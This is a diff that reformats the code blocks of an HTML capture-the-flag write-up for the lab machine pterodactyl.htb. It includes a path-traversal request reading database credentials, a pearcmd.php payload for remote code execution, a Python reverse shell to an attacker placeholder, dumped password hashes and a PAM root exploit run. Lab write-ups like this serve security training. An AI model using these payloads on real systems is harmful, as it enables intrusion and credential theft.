@@ -100,9 +100,7 @@
         exposed services and their versions.
       </p>
       <p class="center-code">
-        <code class="language-bash">
-nmap -sC -sV 10.129.12.87
-          </code>
+        <code class="language-bash">nmap -sC -sV 10.129.12.87</code>
       </p>
       The scan reveals four accessible services:
       <p>
@@ -125,18 +123,14 @@ PORT     STATE  SERVICE    VERSION
         <code>/etc/hosts</code> file to enable proper interaction.
       </p>
       <p>
-        <code class="language-bash">
-echo "10.129.12.87  pterodactyl.htb" >> /etc/hosts
-          </code>
+        <code class="language-bash">echo "10.129.12.87  pterodactyl.htb" >> /etc/hosts</code>
       </p>
       <header class="section-heading">
         <h2 id="overview-title">Directory Enumeration</h2>
       </header>
       <p>We enumerate the website subpages to discover hidden files.</p>
       <p>
-        <code class="language-bash">
-dirsearch -u http://pterodactyl.htb/
-        </code>
+        <code class="language-bash">dirsearch -u http://pterodactyl.htb/</code>
       <p>We identified the following interesting endpoints:</p>
       <pre class="terminal">
               <code>
@@ -153,9 +147,7 @@ dirsearch -u http://pterodactyl.htb/
       </header>
       <p>We enumerate virtual hosts (vhosts) to identify additional exposed services.</p>
       <p>
-        <code class="language-bash">
-ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145
-        </code>
+        <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145</code>
       <pre class="terminal">
               <code>
 
@@ -204,9 +196,7 @@ panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36]
         <code>/var/www/pterodactyl/config/database.php</code>
       </p>
       <p>
-        <code class="language-bash">
-curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl/config&namespace=database" | jq
-          </code>
+        <code class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl/config&namespace=database" | jq</code>
       <p>Extracted database connection details:</p>
       <pre class="terminal">
             <code>
@@ -266,8 +256,7 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodact
       }
     }
   }
-}
-            </code>
+}</code>
           </pre>
       </p>
       <header class="section-heading">
@@ -282,13 +271,10 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodact
       <p>Using the <code>CVE-2025-49132</code> vulnerability, we verify that the <code>pearcmd.php</code> file is
         accessible on the server.</p>
       <p>
-        <code class="language-bash">
-curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"
-        </code>
+        <code class="language-bash">curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"</code>
       <pre class="terminal">
               <code>
-&lt;&excl;DOCTYPE html&gt;&NewLine;&lt;html lang&equals;&quot;en&quot;&gt;&NewLine;    &lt;head&gt;&NewLine;        &lt;meta charset&equals;&quot;utf-8&quot;&gt;&NewLine;        &lt;meta name&equals;&quot;viewport&quot; content&equals;&quot;width&equals;device-width&comma; initial-scale&equals;1&quot;&gt;&NewLine;&NewLine;&period;&period;&period; &NewLine;&NewLine;&NewLine;    &lt;&sol;body&gt;&NewLine;&lt;&sol;html&gt;
-              </code>
+&lt;&excl;DOCTYPE html&gt;&NewLine;&lt;html lang&equals;&quot;en&quot;&gt;&NewLine;    &lt;head&gt;&NewLine;        &lt;meta charset&equals;&quot;utf-8&quot;&gt;&NewLine;        &lt;meta name&equals;&quot;viewport&quot; content&equals;&quot;width&equals;device-width&comma; initial-scale&equals;1&quot;&gt;&NewLine;&NewLine;&period;&period;&period; &NewLine;&NewLine;&NewLine;    &lt;&sol;body&gt;&NewLine;&lt;&sol;html&gt;</code>
             </pre>
       </p>
 
@@ -298,21 +284,16 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../
       <p>To test the vulnerability, we use <code>pearcmd.php</code> to create a PHP script
         (<code>/tmp/payload.php</code>) that executes the <code>id</code> command on the target system.</p>
       <p>
-        <code class="language-bash">
-curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;&plus;config-create&plus;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;&lt;&quest;&equals;system&lpar;base64&lowbar;decode&lpar;&apos;aWQ&equals;&apos;&rpar;&rpar;&quest;&gt;&plus;&sol;tmp&sol;payload&period;php&quot;
-        </code>
+        <code class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;&plus;config-create&plus;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;&lt;&quest;&equals;system&lpar;base64&lowbar;decode&lpar;&apos;aWQ&equals;&apos;&rpar;&rpar;&quest;&gt;&plus;&sol;tmp&sol;payload&period;php&quot;</code>
       </p>
       <p>We execute the previously created PHP file using the same vulnerability:</p>
       <p>
-        <code class="language-bash">
-curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;tmp&amp;namespace&equals;payload&quot;
-        </code>
+        <code class="language-bash">curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&sol;locale&period;json&quest;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;tmp&amp;namespace&equals;payload&quot;</code>
       </p>
       <p>The output confirms successful execution of the <code>id</code> command:</p>
       <pre class="terminal">
         <code>
-&num;PEAR&lowbar;Config 0&period;9&NewLine;a&colon;12&colon;&lcub;s&colon;7&colon;&quot;php&lowbar;dir&quot;&semi;s&colon;108&colon;&quot;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;uid&equals;474&lpar;wwwrun&rpar; gid&equals;477&lpar;www&rpar; groups&equals;477&lpar;www&rpar;
-        </code>
+&num;PEAR&lowbar;Config 0&period;9&NewLine;a&colon;12&colon;&lcub;s&colon;7&colon;&quot;php&lowbar;dir&quot;&semi;s&colon;108&colon;&quot;&sol;&amp;locale&equals;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;&period;&period;&sol;usr&sol;share&sol;php&sol;PEAR&amp;namespace&equals;pearcmd&amp;&sol;uid&equals;474&lpar;wwwrun&rpar; gid&equals;477&lpar;www&rpar; groups&equals;477&lpar;www&rpar;</code>
       </pre>
 
       <header class="section-heading">
@@ -320,9 +301,7 @@ curl &quot;http&colon;&sol;&sol;panel&period;pterodactyl&period;htb&sol;locales&
       </header>
       <p>Python 3.6.15 is installed on the machine, so we use the following payload to obtain a reverse shell.</p>
       <p>
-        <code class="language-python">
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER-IP&gt;",&lt;ATTACKER-PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
-        </code>
+        <code class="language-python">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER-IP&gt;",&lt;ATTACKER-PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</code>
       </p>
       <p>After writing and triggering the payload, we obtain a reverse shell as the user <code>wwwrun</code></p>
 
@@ -331,15 +310,11 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
       </header>
       <p>We enumerate the database to extract stored user credentials.</p>
       <p>
-        <code class="language-bash">
-mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 panel
-        </code>
+        <code class="language-bash">mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 panel</code>
       </p>
       <p>Retrieve user password hashes</p>
       <p>
-        <code class="language-sql">
-select username, password from users;
-        </code>
+        <code class="language-sql">select username, password from users;</code>
       </p>
       <pre class="terminal">
         <code>
@@ -350,9 +325,7 @@ select username, password from users;
 | headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
 | phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
 +--------------+--------------------------------------------------------------+
-2 rows in set (0.001 sec)
-
-        </code>
+2 rows in set (0.001 sec)</code>
       </pre>
       <header class="section-heading">
         <h2 id="description-title">Password cracking</h2>
@@ -367,15 +340,12 @@ select username, password from users;
       </header>
       <p>We enumerate installed packages to identify privilege escalation vectors.</p>
       <p>
-        <code class="language-bash">
-rpm -q pam
-          </code>
+        <code class="language-bash">rpm -q pam</code>
       </p>
       <p>Installed version:</p>
       <pre class="terminal">
           <code>
-pam-1.3.0-150000.6.66.1.x86_64
-          </code>
+pam-1.3.0-150000.6.66.1.x86_64</code>
         </pre>
       <p>This version is vulnerable to a privilege escalation flaw (<code>CVE-2025-6018 & CVE-2025-6019</code>). A
         working exploit is publicly available on GitHub.<a style="font-weight: bold;" href="#references">[2]</a>.</p>
@@ -384,9 +354,7 @@ pam-1.3.0-150000.6.66.1.x86_64
         We execute the public exploit targeting the vulnerable PAM version.
       </p>
       <p>
-        <code class="language-bash">
-./exploit.sh
-        </code>
+        <code class="language-bash">./exploit.sh</code>
       </p>
       <pre class="terminal">
         <code>
@@ -398,19 +366,15 @@ pam-1.3.0-150000.6.66.1.x86_64
 [*] (BG) Setting up loop device...
 [*] (BG) Triggering Resize on /org/freedesktop/UDisks2/block_devices/loop0...
 
-[!!!] HIT! Mounted at: /tmp/blockdev.UBOJK3
-        </code>
+[!!!] HIT! Mounted at: /tmp/blockdev.UBOJK3</code>
       </pre>
       <p>As a result, we obtain a root shell.</p>
       <p>
-        <code class="language-bash">
-id
-        </code>
+        <code class="language-bash">id</code>
       </p>
       <pre class="terminal">
         <code>
-uid=0(root) gid=0(root) groups=0(root),100(users)
-        </code>
+uid=0(root) gid=0(root) groups=0(root),100(users)</code>
       </pre>
     </section>
 
